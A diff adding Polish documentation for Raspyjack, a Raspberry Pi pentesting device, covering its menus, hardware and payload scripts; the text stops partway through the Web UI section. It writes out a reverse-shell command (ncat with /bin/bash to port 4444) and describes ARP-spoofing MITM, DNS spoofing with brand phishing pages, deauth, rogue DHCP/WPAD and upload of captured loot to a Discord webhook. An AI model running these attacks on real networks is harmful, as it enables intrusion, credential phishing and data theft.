@@ -1,0 +1,979 @@
+================================================================================
+              RASPYJACK — KOMPLETNA DOKUMENTACJA PROJEKTU
+================================================================================
+Wygenerowano: 2026-03-12
+Wersja: pełna (zwięzła)
+================================================================================
+
+
+################################################################################
+##  1.  PRZEGLĄD PROJEKTU (PROJECT OVERVIEW)
+################################################################################
+
+Raspyjack to framework do pentestingu oparty na Raspberry Pi z wyświetlaczem
+LCD 1.44" (128x128, ST7735S, SPI). Łączy fizyczne przyciski GPIO, interfejs
+webowy (WebUI) i system payloadów w jedną platformę do skanowania sieci,
+ataków MITM, przechwytywania WiFi, rozpoznania BLE i zdalnego dostępu.
+
+Architektura:
+  raspyjack.py        — główny daemon (GUI + menu + ataki)
+  web_server.py       — HTTP REST API (port 8080)
+  device_server.py    — WebSocket (port 8765, frame mirror + shell + input)
+  payloads/           — niezależne skrypty Python uruchamiane w subprocesie
+  wifi/               — moduły zarządzania WiFi (manager, switch, route)
+  web/                — frontend (dashboard + IDE edytora payloadów)
+  Responder/          — LLMNR/NBNS/mDNS poisoner
+  DNSSpoof/           — phishing sites + ettercap
+  Navarro/            — OSINT username checker
+
+Sekwencja startu:
+  1. Sprawdzenie root (wymaga sudo)
+  2. GPIO BCM init + LCD init
+  3. Wczytanie gui_conf.json (piny, kolory, ścieżki)
+  4. Uruchomienie wątków: _stats_loop (temp/status co 2s), _display_loop (LCD co 100ms)
+  5. System menu (DisposableMenu) — główna pętla nawigacji
+
+Wątki tła:
+  _stats_loop()    — odczyt temperatury CPU + status (scan/MITM/Responder) co 2s
+  _display_loop()  — odświeżanie LCD co 100ms + zapis JPEG do /dev/shm/ dla WebUI
+
+Kluczowe zmienne globalne:
+  _stop_evt           — threading.Event do zamykania wątków
+  screen_lock         — blokada UI podczas wykonywania payloadu
+  _status_text        — aktualny tekst statusu na toolbarze LCD
+  _temp_c             — temperatura CPU
+  draw_lock           — thread-safe rysowanie na LCD
+  FRAME_MIRROR_ENABLED — mirror ekranu do WebUI (domyślnie włączony)
+
+
+################################################################################
+##  2.  HARDWARE & GPIO
+################################################################################
+
+Wyświetlacz: LCD 1.44" 128x128 pikseli, sterownik ST7735S, połączenie SPI.
+Pliki: LCD_1in44.py (driver), LCD_Config.py (konfiguracja SPI/GPIO dla LCD).
+
+Przyciski fizyczne (domyślne piny BCM):
+  KEY_UP_PIN    = GPIO 6     — nawigacja w górę
+  KEY_DOWN_PIN  = GPIO 19    — nawigacja w dół
+  KEY_LEFT_PIN  = GPIO 5     — cofnij / wstecz
+  KEY_RIGHT_PIN = GPIO 26    — potwierdź / dalej
+  KEY_PRESS_PIN = GPIO 13    — potwierdź (center joysticka)
+  KEY1_PIN      = GPIO 21    — przełączanie trybu widoku / funkcja kontekstowa
+  KEY2_PIN      = GPIO 20    — funkcja kontekstowa
+  KEY3_PIN      = GPIO 16    — wstecz / wyjście
+
+Debouncing: 0.10s | Repeat delay: 0.25s | Repeat interval: 0.08s
+
+Plik konfiguracji: gui_conf.json
+  Sekcje: PINS (mapowanie GPIO), COLORS (7 kolorów hex), PATHS (ścieżka startowa obrazów)
+
+gpio_config.py — klasa GPIOConfig:
+  - Automatyczne wykrywanie pliku konfiguracji (lokalny lub /root/Raspyjack/)
+  - load_config() / save_config() — trwałe przechowywanie w JSON
+  - get_pin(name) / set_pin(name, number) — zarządzanie pinami
+  - Globalny singleton: gpio_config = GPIOConfig()
+
+Domyślne kolory:
+  Background: #000000 | Border: #05ff00 | Text: #05ff00
+  Selected text: #00ff55 | Selected bg: #2d0fff
+  Gamepad border: #141494 | Gamepad fill: #eeeeee
+
+
+################################################################################
+##  3.  INPUT — SYSTEM WEJŚCIA
+################################################################################
+
+--- input_events.py (zaawansowany menedżer zdarzeń) ---
+Klasa ButtonEventManager — generuje zdarzenia na podstawie pollingu GPIO:
+  PRESS        — przycisk naciśnięty
+  RELEASE      — przycisk zwolniony
+  CLICK        — krótkie naciśnięcie
+  DOUBLE_CLICK — dwa naciśnięcia w oknie 0.30s
+  LONG_PRESS   — przytrzymanie 0.80s
+  REPEAT       — cykliczne zdarzenia przy przytrzymaniu (start 0.50s, interwał 0.15s)
+
+Format zdarzenia: {"type": "CLICK", "button": "KEY_UP_PIN", "ts": 12345.67}
+Polling co 5ms. Opcjonalny plugin_dispatch(event) callback.
+
+--- rj_input.py (most wirtualnych przycisków dla WebUI) ---
+Unix socket: /dev/shm/rj_input.sock (AF_UNIX, datagram, chmod 0o666)
+Protokół JSON: {"type":"input", "button":"UP|DOWN|LEFT|RIGHT|OK|KEY1|KEY2|KEY3", "state":"press|release"}
+Mapowanie: UP→KEY_UP_PIN, DOWN→KEY_DOWN_PIN, LEFT→KEY_LEFT_PIN,
+           RIGHT→KEY_RIGHT_PIN, OK→KEY_PRESS_PIN, KEY1→KEY1_PIN itd.
+Umożliwia sterowanie urządzeniem z przeglądarki webowej.
+
+
+################################################################################
+##  4.  DRZEWO MENU GUI (kompletna hierarchia)
+################################################################################
+
+MENU GŁÓWNE (klucz "a") — 10 pozycji:
+┌─────────────────────────────────────────────────────┐
+│ 1. Scan Nmap          → podmenu "ab" (12 typów)     │
+│ 2. Reverse Shell      → podmenu "ac" (2 opcje)      │
+│ 3. Responder          → podmenu "ad" (ON/OFF)       │
+│ 4. MITM & Sniff       → podmenu "ai" (Start/Stop)   │
+│ 5. DNS Spoofing       → podmenu "aj" (Start/Stop/Site)│
+│ 6. Network info       → ShowInfo() (bezpośrednie)   │
+│ 7. WiFi Manager       → podmenu "aw" (7 opcji)      │
+│ 8. Other features     → podmenu "ag"                │
+│ 9. Read file          → podmenu "ah"                │
+│ 10. Payload           → podmenu "ap" (dynamiczne)   │
+└─────────────────────────────────────────────────────┘
+
+--- PODMENU "ab" — Scan Nmap (12 typów skanów) ---
+  Quick Scan        : nmap -T5
+  Full Port Scan    : nmap -p-
+  Service Scan      : nmap -T5 -sV
+  Vulnerability     : nmap -T5 -sV --script vuln
+  Full Vulns        : nmap -p- -sV --script vuln
+  OS Scan           : nmap -T5 -A
+  Intensive Scan    : nmap -O -p- --script vuln
+  Stealth SYN Scan  : nmap -sS -T4
+  UDP Scan          : nmap -sU -T4
+  Ping Sweep        : nmap -sn
+  Top100 Scan       : nmap --top-ports 100 -T4
+  HTTP Enumeration  : nmap -p 80,81,443,8080,8443 -sV --script http-enum,http-title
+
+  Każdy skan:
+    - Wybór interfejsu (auto/eth0/eth1/wlan0/wlan1)
+    - Autodetekcja sieci CIDR lub wybór maski /24, /16, /8
+    - Output: /root/Raspyjack/loot/Nmap/{label}_{timestamp}.txt + .xml
+    - Automatyczne wysłanie wyników na Discord webhook (jeśli skonfigurowany)
+
+--- PODMENU "ac" — Reverse Shell ---
+  Defaut Reverse  : pobiera prefix IP z interfejsu, pyta o ostatni oktet
+                    → ncat [target_ip] 4444 -e /bin/bash
+  Remote Reverse  : hardcoded 192.168.1.30:4444 z /bin/bash
+
+--- PODMENU "ad" — Responder ---
+  Responder ON    : python3 Responder.py -Q -I {interface}
+                    Sprawdza czy już działa. Wybór interfejsu.
+  Responder OFF   : killall procesu Responder
+
+--- PODMENU "ai" — MITM & Sniff ---
+  Start MITM & Sniff:
+    1. Zabija istniejące arpspoof/tcpdump
+    2. Skanuje sieć arp-scan --localnet
+    3. Pobiera gateway + wszystkie hosty
+    4. Uruchamia arpspoof dla każdego hosta (bidirectional)
+    5. Włącza IP forwarding (echo 1 > /proc/sys/net/ipv4/ip_forward)
+    6. Startuje tcpdump → plik .pcap
+  Stop MITM & Sniff:
+    Killall arpspoof + tcpdump, wyłącza IP forwarding
+
+--- PODMENU "aj" — DNS Spoofing ---
+  Start DNSSpoofing:
+    1. Modyfikuje /etc/ettercap/etter.dns z IP interfejsu
+    2. Uruchamia PHP server: php -S 0.0.0.0:80 w DNSSpoof/sites/{site}
+    3. Uruchamia ettercap: ettercap -Tq -M arp:remote -P dns_spoof -i {iface}
+  Select site → podmenu "ak" (24 strony phishingowe)
+  Stop DNS&PHP: killall php + ettercap
+
+--- PODMENU "ak" — DNS Spoofed Sites (24 szablony) ---
+  microsoft, wordpress, instagram, google, amazon, apple, twitter,
+  netflix, spotify, paypal, linkedin, snapchat, pinterest, yahoo,
+  steam, adobe, badoo, icloud, instafollowers, ldlc, origin,
+  playstation, protonmail, shopping, wifi, yandex
+
+--- PODMENU "aw" — WiFi Manager (7 opcji, wymaga WIFI_AVAILABLE) ---
+  Full WiFi Manager    : uruchamia general/wifi_manager_payload.py
+  FAST WiFi Switcher   : uruchamia general/fast_wifi_switcher.py
+  INSTANT Toggle 0↔1   : natychmiastowe przełączenie wlan0/wlan1
+  Switch Interface     : menu wyboru interfejsu
+  Show Interface Info  : wyświetla szczegóły aktualnego interfejsu
+  WebUI                : wyświetla URL WebUI
+  Route Control        → podmenu "awr"
+
+--- PODMENU "awr" — Route Control (4 opcje) ---
+  Show Routing Status  : aktualny default route
+  Switch to WiFi       : wymusza WiFi jako primary
+  Switch to Ethernet   : wymusza Ethernet jako primary
+  Interface Switcher   : zaawansowane przełączanie interfejsów
+
+--- PODMENU "ag" — Other Features ---
+  Browse Images    : przeglądarka obrazów (.gif/.png/.bmp/.jpg) od /root/
+  Discord status   : wyświetla konfigurację Discord webhook
+  Options          → podmenu "ae" (kolory)
+  System           → podmenu "af"
+
+--- PODMENU "ae" — Colors (7 pozycji) ---
+  Background, Text, Selected text, Selected background,
+  Border, Gamepad border, Gamepad fill
+  Każdy otwiera RGB picker (GetColor): UP/DOWN ±5, KEY1/KEY3 ±1, zakres 0-255
+
+--- PODMENU "af" — System ---
+  Shutdown system  : wyłączenie Raspberry Pi
+  Restart UI       : restart procesu RaspyJack
+
+--- PODMENU "ah" — Read File ---
+  Nmap      : przeglądanie /root/Raspyjack/loot/Nmap/ (.txt, .json, .conf, .pcap)
+  Responder : przeglądanie /root/Raspyjack/Responder/logs/
+  DNSSpoof  : przeglądanie /root/Raspyjack/DNSSpoof/captures/
+
+--- PODMENU "ap" — Payload (dynamicznie generowane) ---
+  Automatycznie kategoryzowane po folderach:
+  📁 reconnaissance, 📁 interception, 📁 evil_portal, 📁 exfiltration,
+  📁 remote_access, 📁 general, 📁 games, 📁 examples
+  Każdy folder rozwija się w listę plików .py.
+  Payloady uruchamiane w subprocesie z izolacją, log → /root/Raspyjack/loot/payload.log
+
+
+################################################################################
+##  5.  TRYBY WIDOKU MENU (przełączanie KEY1)
+################################################################################
+
+1. LIST (domyślny):
+   7 pozycji widocznych, zaznaczenie prostokątem, ikony FontAwesome, tekst obcinany.
+
+2. GRID:
+   2 kolumny × 4 wiersze (8 pozycji), duże ikony, nawigacja 4 kierunkowa.
+
+3. CAROUSEL:
+   Jeden element centrowany z dużą ikoną (48pt), strzałki LEFT/RIGHT,
+   nazwa pod ikoną, zawijanie na końcach listy.
+
+
+################################################################################
+##  6.  DIALOGI I KOMPONENTY UI
+################################################################################
+
+Dialog(text, wait)           — szare tło, czerwony OK, czeka na przycisk
+Dialog_info(text, wait, to)  — zielone tło, opcjonalny timeout z progress barem
+YNDialog(text, yes, no)      — LEFT/KEY1=Tak, RIGHT/KEY3=Nie, PRESS=Potwierdź
+GetMenuString(list)          — scrollowalna lista 7 elementów, zwraca wybór lub ""
+GetMenuGrid(list)            — siatka 2×4, nawigacja 4-kierunkowa
+GetMenuCarousel(list)        — karuzela z dużą ikoną
+GetColor(hex)                — picker RGB (3 suwaki R,G,B), podgląd na żywo
+
+Układ ekranu LCD:
+  Top toolbar (0-10px): temperatura CPU (lewo) + status (prawo)
+  Menu area (14-127px): ramka 5px + tło + tekst (8 linii, Y: 22..120, odstęp 14px)
+  Fonty: DejaVu Sans 9pt (tekst), FontAwesome 12pt (ikony)
+  Odświeżanie: ~10 FPS (100ms/klatka)
+
+
+################################################################################
+##  7.  FUNKCJE SIECIOWE (wbudowane w raspyjack.py)
+################################################################################
+
+Wykrywanie interfejsów:
+  get_best_interface_prefer_eth() — preferuje kablowy (eth0/eth1) jeśli link up
+  _get_interface_ipv4(iface) — IP + maska przez netifaces
+  _get_operstate(iface)      — stan interfejsu (up/down)
+  _get_routed_info()         — default route + gateway
+  _choose_interface_for_action() — dialog: Auto/eth0/eth1/wlan0/wlan1 z IP
+
+ShowInfo():
+  Wyświetla: interfejs, routed iface, IP, subnet, gateway, SSID (WiFi).
+  Scrollowalne, auto-odświeżanie co 2s.
+
+Discord webhook:
+  Plik: /root/Raspyjack/discord_webhook.txt (URL webhook)
+  send_to_discord() — wysyła wyniki Nmap jako załącznik z embedem
+  (label, sieć, interfejs, timestamp, kolor zielony). Wątek tła, nieblokujące.
+
+
+################################################################################
+##  8.  SYSTEM PAYLOADÓW — MECHANIZM URUCHAMIANIA
+################################################################################
+
+Lokalizacja: /root/Raspyjack/payloads/{kategoria}/{skrypt}.py
+
+exec_payload() — flow wykonania:
+  1. Parsowanie nazwy pliku (obsługa tupli z argumentami)
+  2. Blokada UI (screen_lock.set())
+  3. Czyszczenie LCD
+  4. Uruchomienie w subprocess z PYTHONPATH
+  5. Log stdout/stderr → /root/Raspyjack/loot/payload.log
+  6. Po zakończeniu: reinicjalizacja GPIO/LCD, redraw menu
+
+Stan payloadu: /dev/shm/rj_payload_state.json
+  {"running": true/false, "path": "category/script", "ts": timestamp}
+
+WebUI payload request: /dev/shm/rj_payload_request.json
+  {"action":"start", "path":"category/script"} — auto-uruchomienie + usunięcie pliku
+
+_input_helper.py — warstwa abstrakcji wejścia:
+  Najpierw próbuje wirtualne przyciski WebUI, potem GPIO.
+  get_button(PINS, GPIO) → UP/DOWN/LEFT/RIGHT/OK/KEY1/KEY2/KEY3
+  Używany przez praktycznie wszystkie payloady.
+
+Standardowy wzorzec payloadu:
+  1. sys.path.append + importy (RPi.GPIO, LCD_1in44, PIL, _input_helper)
+  2. GPIO BCM setup + LCD init + LCD clear
+  3. Signal handlers (SIGINT/SIGTERM → running=False)
+  4. Main loop: get_button() → przetwarzanie → aktualizacja LCD → sleep
+  5. Finally: LCD clear + GPIO cleanup
+
+
+================================================================================
+##  8.1  PAYLOADY — GAMES (7 plików)
+================================================================================
+
+--- Breakout.py / game_Breakout.py (duplikat) ---
+  Cel: Klasyczna gra Breakout — paletka, piłka, klocki.
+  Sterowanie: LEFT/RIGHT ruch paletki, KEY1 start/reset, KEY3 wyjście.
+  Mechanika: fizyka piłki z rotacją, kolizje directional z klockami, score.
+  LCD: pełnoekranowy rendering ~30 FPS, rysowanie paletki/piłki/klocków.
+  Zależności: RPi.GPIO, LCD_1in44, Pillow, _input_helper.
+
+--- snake.py / game_snake.py (duplikat) ---
+  Cel: Klasyczny Snake na siatce 16×16 (komórki 8px).
+  Sterowanie: UP/DOWN/LEFT/RIGHT kierunek (blokada cofania), OK restart, KEY3 quit.
+  Mechanika: losowe jedzenie, kolizje ze ścianami i sobą, wzrost przy jedzeniu.
+  LCD: zielony wąż, czerwone jedzenie, header ze score. ~8 FPS.
+  Zależności: RPi.GPIO, LCD_1in44, Pillow, _input_helper.
+
+--- conways_game_of_life.py ---
+  Cel: Automat komórkowy Conway's Game of Life.
+  Sterowanie: OK/RIGHT run/pause, Strzałki kursor (w pauzie), KEY1 randomize,
+              KEY2 toggle komórka, KEY3 wyjście.
+  Mechanika: reguły Conwaya (narodziny=3, przetrwanie=2-3), zawijanie granic.
+  LCD: siatka 24×22 (komórki 5px), kolorowa, licznik generacji + alive count.
+
+--- game_2048.py ---
+  Cel: Puzzle 2048 — łączenie kafelków.
+  Sterowanie: Strzałki przesuwanie, KEY1 nowa gra, KEY3 wyjście.
+  Mechanika: compress→merge→rotate, losowe 2/4, detekcja wygranej (2048) i przegranej.
+  LCD: siatka 4×4, kolorowe kafelki (ciemniejsze=wyższe wartości), score na górze.
+
+--- game_tetris.py ---
+  Cel: Klon Tetrisa z 7 kształtami tetromino.
+  Sterowanie: LEFT/RIGHT ruch, UP obrót, DOWN soft-drop, KEY1 hard-drop, KEY3 exit.
+  Mechanika: 7 tetromino z rotacją, kasowanie linii, przyspieszanie per level.
+  LCD: plansza 10×20, kolorowe klocki, podgląd następnego, score header.
+
+
+================================================================================
+##  8.2  PAYLOADY — GENERAL / UTILITY (11 plików)
+================================================================================
+
+--- auto_update.py ---
+  Cel: Automatyczna aktualizacja Raspyjack przez git.
+  Komendy: git fetch origin/main, git reset --hard, apt install, tar backup/restore
+  Sterowanie: KEY1 start aktualizacji, KEY3 anuluj.
+  Flow: backup tar.gz → sprawdź dysk → apt install deps → git fetch/reset →
+        restore custom payloads → install_raspyjack.sh → reboot.
+  Output: backup w /root/Raspyjack, progress na LCD.
+
+--- badusb_detector.py ---
+  Cel: Wykrywanie zagrożeń BadUSB — monitoring USB + klawiatur.
+  Komendy: pyudev (subsystem=usb), evdev (keylogger detection), pgrep
+  Sterowanie: KEY3 wyjście.
+  Mechanika: 3 wątki: monitor_usb(), monitor_input(), _watch_keyboard_continuous().
+  Alert: CZERWONY ekran gdy >1 naciśnięcie klawisza w 2s oknie. Auto-clear po 8s.
+
+--- bt_keyboard_picker.py ---
+  Cel: Interaktywne parowanie klawiatury Bluetooth.
+  Komendy: bluetoothctl (scan, pair, trust, connect)
+  Sterowanie: UP/DOWN nawigacja listy, OK wybór, KEY3 wstecz.
+  Flow: 10s skan BT → lista urządzeń → sekwencja: power on → agent on →
+        pair → trust → connect. Obsługa passkey na ekranie.
+
+--- fast_wifi_connect.py ---
+  Cel: Szybkie połączenie z najsilniejszym zapisanym WiFi.
+  Komendy: nmcli connection show, nmcli device wifi scan --rescan,
+           nmcli device wifi connect SSID, ip -4 addr show wlan0
+  Sterowanie: brak (automatyczne).
+  Flow: pobierz zapisane profile → skanuj → filtruj dopasowania → połącz z
+        najsilniejszym → wyświetl IP. Progress bar na LCD.
+
+--- fast_wifi_switcher.py ---
+  Cel: Szybkie przełączanie wlan0/wlan1 (<100ms).
+  Komendy: ip link show, raspyjack_integration.set_raspyjack_interface()
+  Sterowanie: KEY1 wlan0, KEY2 wlan1, UP/DOWN toggle, CENTER status, KEY3 exit.
+  Mechanika: FastWiFiSwitcher z polling 10ms. Status co 2s na LCD.
+
+--- interface_status.py ---
+  Cel: Monitoring interfejsów Ethernet w czasie rzeczywistym.
+  Komendy: odczyt sysfs /sys/class/net/*/operstate i /sys/class/net/*/statistics/*
+  Sterowanie: KEY3 wyjście.
+  LCD: split-screen (lewa eth1, prawa eth0), IP, RX/TX (B/K/M/G). Refresh 0.5s.
+
+--- keyboard_tester.py ---
+  Cel: Wyświetlanie nazw klawiszy z klawiatury USB.
+  Komendy: evdev.list_devices(), select.poll()
+  Sterowanie: KEY3 / ESC wyjście.
+  LCD: nazwa klawisza centrowana w zielonym na czarnym tle.
+
+--- LanTest.py ---
+  Cel: Test prędkości LAN przez iperf3 (tylko Ethernet).
+  Komendy: iperf3 -c <server> -J -R -t <time> (download), iperf3 -c <server> -J (upload)
+  Sterowanie: OK uruchom, KEY1 toggle czas (5/10/15s), KEY2 reload serwer, KEY3 exit.
+  Serwer: z loot/speedtest_server.txt lub gateway IP. Log: loot/speedtest.csv.
+
+--- latency.py ---
+  Cel: Monitoring RTT i jittera z wykresami sparkline w czasie rzeczywistym.
+  Komendy: ping -c 1, arping -c 1, socket TCP connect timing
+  Sterowanie: OK pauza/run, KEY2 reset statystyk, KEY3 exit.
+  LCD: multi-target sparkline, 64 próbek, kolorowanie: ≤30ms zielony, 31-80ms żółty,
+       >80ms czerwony. Jitter via pstdev(). Log: loot/latency_jitter.csv.
+
+--- WanTest.py ---
+  Cel: Test prędkości internetu (speedtest.net).
+  Komendy: speedtest --simple lub speedtest-cli (auto-install via apt-get)
+  Sterowanie: OK start, KEY1 toggle single-connection, KEY3 exit.
+  Dual backend: Python speedtest module lub Ookla CLI z fallbackiem.
+  Log: loot/speedtest_wan.csv. Wyświetla: download/upload Mbps, ping, jitter, ISP.
+
+--- webui.py ---
+  Cel: Wyświetlenie URL dostępu do WebUI.
+  Sterowanie: KEY3/LEFT powrót.
+  LCD: HTTPS (preferowany) i HTTP (8080) URL. Preferuje wlan0 jako interfejs WebUI.
+
+
+================================================================================
+##  8.3  PAYLOADY — RECONNAISSANCE (10 plików)
+================================================================================
+
+--- analyzer.py ---
+  Cel: Analiza widma WiFi + BLE w czasie rzeczywistym.
+  Komendy: airmon-ng start, iwconfig channel, iw dev set channel, Scapy sniffing,
+           BLE HCI raw socket
+  Sterowanie: LEFT/RIGHT pasma, UP/DOWN dwell time (0.1-2.0s), KEY1 start/stop,
+              KEY2 exit, KEY3 reset.
+  LCD: 4-rzędowy display ze sparkline'ami (64 punkty), kolory green/yellow/red.
+  Pasma: 2.4GHz (ch 1-13), 5GHz (ch 36-165), ALL WiFi, BLE Dev, BT Freq.
+  Output: loot/Analyzer/ (PCAP + JSON).
+
+--- autoNmapScan.py ---
+  Cel: Okresowe automatyczne skanowanie nmap co 2 godziny.
+  Komendy: nmap -T4 -oN .txt -oX .xml <target>
+  Sterowanie: KEY1 ręczny skan, KEY2 toggle auto-skan, KEY3 exit.
+  LCD: status + odliczanie do następnego skanu.
+  Output: loot/Nmap/periodic_scan_*.txt i .xml.
+
+--- cam_finder.py ---
+  Cel: Wykrywanie kamer bezpieczeństwa przez OUI/SSID pattern matching.
+  Komendy: dziedziczone z wardriving (airmon-ng, Scapy packet capture)
+  Baza OUI: 100+ vendorów (Ring, Blink, Nest, Wyze, Arlo, Hikvision, Dahua itd.)
+  SSID patterns: 60+ wzorców (Ring-*, Blink-*, Camera-* itd.)
+  _is_camera_mac() — lookup OUI. _is_camera_ssid() — dopasowanie wzorców.
+  Output: loot/CamFinder/cameras.db (SQLite).
+
+--- device_scout.py ---
+  Cel: Śledzenie urządzeń z oceną persistencji (anti-surveillance).
+  Komendy: airmon-ng, HCI BLE socket, Scapy WiFi capture
+  Sterowanie: LEFT/RIGHT widoki (DEVICES/ALERTS/STATS), UP/DOWN scroll,
+              KEY1 start/stop, KEY2 exit, KEY3 export CSV/JSON.
+  Scoring: (rate×0.4) + (recency×0.3) + (duration×0.3). Alert: persistence≥0.70 + 5min.
+  Trackery: AirTag (0x004C), Tile (0xFFFE), SmartTag (0x0075).
+  Output: loot/DeviceScout/ (CSV + JSON).
+
+--- dns_leaker.py ---
+  Cel: Pasywne rozpoznanie DNS w sieci.
+  Komendy: Scapy sniffing UDP 53 (DNS) + 137 (NBNS)
+  Sterowanie: UP/DOWN scroll, KEY3 exit.
+  LCD: 4 sekcje — DNS count, NBNS count, internal count, TOP queries (2 widoczne).
+  Detekcja internal: sufiksy .local, .lan, .corp, .internal + rekordy serwisowe.
+  Log: loot/MITM/Log-DNS.txt.
+
+--- navarro.py ---
+  Cel: Interaktywny OSINT — skanowanie nazw użytkowników przez Navarro.
+  Komendy: navarro -u <username> -oJ <json> (subprocess Popen, non-blocking)
+  Sterowanie: Strzałki nawigacja, OK wybór, KEY1 start/backspace, KEY2 strona
+              klawiatury, KEY3 cancel.
+  UI: klawiatura ekranowa 3-stronnicowa (lowercase/UPPERCASE/123+symbols),
+      bouncing progress bar, wyniki 6/stronę, detail z opcjonalnym QR kodem.
+  Output: loot/OSINT/navarro_<user>_<ts>/results.json.
+
+--- smb_probe.py ---
+  Cel: Odkrywanie usług SMB (port 445).
+  Komendy: nmap -n -p 445 --open -oN <file> <target>
+  Sterowanie: UP/DOWN scroll, OK wybór interfejsu/maski, KEY3 wstecz.
+  Flow: wybór interfejsu → maska (/24 lub /16) → skan → scrollowalna lista wyników.
+  Output: loot/SMB/smb_probe_*.txt.
+
+--- tailscale_control.py ---
+  Cel: Zarządzanie VPN Tailscale z poziomu LCD.
+  Komendy: tailscale up, tailscale down, tailscale status --json, tailscale ip -4,
+           pgrep -x tailscaled
+  Sterowanie: KEY1 tailscale up (+auto SSH), KEY2 tailscale down, KEY3 exit.
+  LCD: 3 linie: daemon on/off, stan (Running/Stopped/NeedsLogin), IPv4.
+  Uwaga: auth musi być wcześniej skonfigurowany (brak interaktywnego loginu).
+
+--- wall_of_flippers.py ---
+  Cel: Wykrywanie Flipper Zero i zagrożeń BLE.
+  Komendy: hciconfig (enumeracja HCI), Bleak/Bluepy/bluetoothctl (auto-fallback)
+  Sterowanie: UP/DOWN nawigacja, LEFT/RIGHT widoki, OK potwierdź, KEY1 start/stop,
+              KEY2 exit, KEY3 export.
+  Detekcja Flipper: 3 wzorce UUID + 3 prefiksy MAC (80:e1:26, 80:e1:27, 0c:fa:22).
+  Widoki: DEVICES, THREATS, HISTORY, SETTINGS.
+  Rate limiting: >3 flipperów w 5s = podejrzane. Offline timeout: 25s.
+
+--- wardriving.py ---
+  Cel: Kompleksowe mapowanie sieci WiFi.
+  Komendy: airmon-ng start, airodump-ng --band abg --csv, iwconfig channel,
+           opcjonalny GPS (u-blox 7 via gpsd)
+  Baza: SQLite z tabelami networks (SSID, BSSID, channel, security, signal, vendor)
+        i locations (lat/lon/alt z GPS timestamps).
+  Eksport: JSON, CSV, KML. Channel hopping. Vendor MAC lookup.
+  Output: loot/wardriving/wardriving.csv + SQLite DB.
+
+
+================================================================================
+##  8.4  PAYLOADY — INTERCEPTION (3 pliki)
+================================================================================
+
+--- deauth.py ---
+  Cel: Multi-target WiFi deauth z adaptywnym wyborem interfejsu.
+  Komendy: airmon-ng start, iwconfig mode monitor, iw set channel,
+           airodump-ng --band abg --csv, aireplay-ng --deauth 0 -a <target>
+  Sterowanie: KEY1 skan sieci, LEFT adjust timeout, RIGHT zmiana trybu,
+              OK wybór/atak, KEY2 stop, KEY3 exit.
+  Mechanika: 3 metody monitor-mode (airmon-ng → iwconfig → iw z fallbackiem).
+  Skanowanie CSV, multi-select celów, ciągły broadcast deauth (0 = unlimited).
+  Chroni WebUI: omija onboard WiFi. Log: deauth_debug.log + deauth_attack.log.
+
+--- rogue_dhcp_wpad.py ---
+  Cel: Ukryty atak DHCP + WPAD proxy injection.
+  Komendy: dnsmasq (DHCP z option 252 WPAD), ip addr add/flush,
+           Python HTTP server port 80 (WPAD PAC file)
+  Sterowanie: UP/DOWN menu, OK wybór, KEY3 wstecz.
+  Flow: wybór interfejsu (z IP) → maska (/24 lub /16) → dnsmasq config z WPAD →
+        HTTP server z PAC file → monitoring DHCPACK via tail -f.
+  Popup przy wykryciu klienta DHCP. Log: loot/DHCP/rogue_dhcp_*.log.
+
+--- silent_bridge.py ---
+  Cel: Całkowicie stealth transparent bridge z analizą protokołów.
+  Komendy: ip link add br0 type bridge, ip link set master br0,
+           ip link set promisc on, tcpdump -i br0 -w, tshark -i br0 -T fields
+  Sterowanie: KEY3 stop.
+  Mechanika: auto-detekcja 2 aktywnych interfejsów, br0 BEZ IP (stealth),
+             tcpdump capture do PCAP, tshark live protocol counting.
+  LCD: siatka 14 protokołów (DNS, HTTP, TLS, ICMP, ARP, SMB, FTP, SSH,
+       DHCP, NTP, QUIC, SMTP, SNMP, RDP).
+  Output: loot/MITM/stealth_bridge_*.pcap.
+
+
+================================================================================
+##  8.5  PAYLOADY — EVIL PORTAL (1 plik)
+================================================================================
+
+--- honeypot.py ---
+  Cel: Multi-port low-interaction honeypot z fingerprintingiem usług.
+  Komendy: asyncio TCP listeners na portach 21/22/23/25/80/443/8080
+  Sterowanie: KEY1 toggle alertów Discord, KEY2 cykl widoków, KEY3 exit.
+  Usługi: SSH banner, Telnet login, FTP credentials, SMTP headers,
+          HTTP/Apache spoofing (emulacja Ubuntu).
+  Profile: basic (22,23,80,8080), web (80,443,8080), all (21-5900).
+  Discord: opcjonalne powiadomienia (rate-limit 2s między wiadomościami).
+  Log: loot/honeypot/events_*.jsonl (JSONL per-connection metadata).
+
+
+================================================================================
+##  8.6  PAYLOADY — EXFILTRATION (1 plik)
+================================================================================
+
+--- exfiltrate_discord.py ---
+  Cel: Archiwizacja i upload folderu loot na Discord webhook.
+  Komendy: requests.post() (multipart upload), zipfile (in-memory ZIP)
+  Mechanika: rekursywny walk po loot/, loot/MITM/, loot/Nmap/, Responder/logs/ →
+             ZIP archive z timestamp → walidacja ≤8 MiB (limit Discord) → upload.
+  Zależności: requests, zipfile, pathlib.
+
+
+================================================================================
+##  8.7  PAYLOADY — REMOTE ACCESS (2 pliki)
+================================================================================
+
+--- shell.py ---
+  Cel: Interaktywny terminal /bin/bash na LCD 128×128 przez klawiaturę USB.
+  Komendy: pty.fork() → /bin/bash --login, fcntl O_NONBLOCK
+  Sterowanie: KEY1 font+ (+1px), KEY2 font- (-1px), KEY3/ESC exit.
+  Mechanika: PTY fork, polling PTY + keyboard jednocześnie via select.poll().
+  Keymap: ASCII + specjalne (Enter, Backspace, Tab, Shift combos).
+  LCD: DejaVu Mono 6-10px, scrollback 256 linii, ANSI stripping, word wrap.
+
+--- tailscale_control.py ---
+  (Duplikat reconnaissance/tailscale_control.py — identyczna funkcjonalność)
+
+
+================================================================================
+##  8.8  PAYLOADY — EXAMPLES (2 pliki)
+================================================================================
+
+--- _payload_template.py ---
+  Cel: Boilerplate startowy dla nowych payloadów (~40 linii).
+  Zawiera: setup importów, GPIO init, LCD init, main loop, cleanup.
+
+--- example_show_buttons.py ---
+  Cel: Tutorial demonstracji przycisków z rozbudowanymi komentarzami.
+  Pokazuje: centrowanie tekstu, non-blocking polling, GPIO cleanup, signal handling.
+
+
+################################################################################
+##  9.  WEB UI — DASHBOARD + IDE
+################################################################################
+
+=== DASHBOARD (index.html + app.js) ===
+
+Cel: Główny panel sterowania w przeglądarce.
+
+Symulator LCD:
+  Canvas 128×128 z mirroringiem ekranu urządzenia (JPEG via WebSocket).
+  3 theme'y: Neon (domyślny, zielony glow), Game Boy (szary plastik), Pager (retro).
+
+Wirtualny gamepad:
+  8 przycisków: UP/DOWN/LEFT/RIGHT/OK/KEY1/KEY2/KEY3.
